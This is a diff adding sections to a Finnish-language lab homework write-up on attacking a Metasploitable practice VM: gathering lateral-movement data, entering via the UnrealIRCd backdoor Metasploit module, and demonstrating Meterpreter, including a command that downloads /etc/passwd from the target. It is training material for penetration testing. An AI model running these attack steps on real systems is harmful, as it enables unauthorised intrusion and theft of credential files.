@@ -48,6 +48,28 @@ Komennolla `setg RHOSTS 192.168.56.11` asetin Metasploitablen remote host koneek
 Ajoin komennon `exploit` ja pääsin sisälle meterpreter sessioon.  
 <img width="936" height="155" alt="image" src="https://github.com/user-attachments/assets/8fa954c0-e2f9-4460-8961-c0109686a3a3" />  
 
+## g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta  
+Keräsin seuraavia tietoja metasploitablesta.  
+<img width="403" height="540" alt="image" src="https://github.com/user-attachments/assets/dd9e1259-f1a0-4778-8c4e-a02a63bc9a45" />  
+<img width="631" height="726" alt="image" src="https://github.com/user-attachments/assets/8a28d156-7743-4721-ad53-433983c25ad3" />  
+<img width="346" height="90" alt="image" src="https://github.com/user-attachments/assets/51417322-297a-4325-bb1b-d425dff8d43b" />  
+Näillä tiedoillä näkee muun muassa interfacet, koneet joihin metasploitable on ollut yhteydessä, käyttäjätunnukset ja pääsyavaimet.  
+
+## h) Murtaudu Metasploitableen jollain toisella tavalla  
+Valitsin toiseksi tavaksi UnrealIRCd-backdoor (portti 6667). Komento `use exploit/unix/irc/unreal_ircd_3281_backdoor` lataa hyökkäyksen.  
+<img width="1197" height="387" alt="image" src="https://github.com/user-attachments/assets/93f6bd17-9aa6-40ee-bdad-dfe207dc0cd6" />  
+Hostit ja portit ovat oikein. 
+`exploit` ja sisällä ollaan.  
+<img width="1222" height="239" alt="image" src="https://github.com/user-attachments/assets/190a0aea-cb16-4230-a3ee-b6e363a4a05a" />  
+
+## i) Demonstroi Meterpretrin ominaisuuksia  
+Komennolla `getuid` näkee millä käyttäjällä olet. Komennolla `sysinfo` näkee järjestelmän tiedot.  
+<img width="430" height="157" alt="image" src="https://github.com/user-attachments/assets/93bae600-a876-4ca6-87b7-7ae197bd32f8" />  
+`ps` näyttää kaikki käynnissä olevat prosessit.  
+<img width="509" height="1153" alt="image" src="https://github.com/user-attachments/assets/5ecce382-4cfb-4a52-bbca-e9f50765c8c4" />  
+Komennolla `download /etc/passwd /tmp/passwd_metasploitable.txt` pystyt ladata tiedostoja omalle koneellesi.  
+<img width="812" height="88" alt="image" src="https://github.com/user-attachments/assets/2c3fe6a0-4f42-4f94-b0ce-f1db1377ae0f" />  
+
 
 
 
